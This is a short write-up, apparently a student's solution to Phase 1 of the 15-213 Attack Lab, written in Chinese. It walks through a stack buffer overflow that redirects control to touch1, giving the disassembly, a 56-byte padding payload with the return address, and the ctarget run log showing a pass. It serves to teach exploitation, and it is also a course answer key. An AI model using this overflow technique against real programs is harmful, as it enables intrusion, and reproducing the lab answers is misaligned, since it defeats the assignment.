# Phase 1

```log
0000000000401839 <touch1>:
  401839:       48 83 ec 08             sub    $0x8,%rsp
  40183d:       c7 05 b5 2c 20 00 01    movl   $0x1,0x202cb5(%rip)        # 6044fc <vlevel>
  401844:       00 00 00 
  401847:       48 8d 3d a9 19 00 00    lea    0x19a9(%rip),%rdi        # 4031f7 <_IO_stdin_used+0x307>
  40184e:       e8 6d f4 ff ff          callq  400cc0 <puts@plt>
  401853:       bf 01 00 00 00          mov    $0x1,%edi
  401858:       e8 d6 04 00 00          callq  401d33 <validate>
  40185d:       bf 00 00 00 00          mov    $0x0,%edi
  401862:       e8 c9 f5 ff ff          callq  400e30 <exit@plt>
```

要调用touch1，只需要构造长度为56的任意二进制数据，然后获取touch1的地址，并以小端法十六进制表示，最后使用hex2raw生成输入数据即可。

由objdump的结果可知，touch1的地址为0x401839，所以以小端法表示则为39 18 40 00 00 00 00 00，最终可构造出以下结果。

```log
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 39 18 40 00 00 00 00 00
```

使用hex2raw配合管道运行ctarget，便可通过touch1。

```log
hsojo@ubuntu:~/Downloads/target<stu_number>$ ./hex2raw -i touch1.txt | ./ctarget -q
Cookie: 0x1fb6091a
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
    user id <stu_number>
    course  15213-f15
    lab attacklab
    result  -259586058:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 39 18 40 00 00 00 00 00 
```
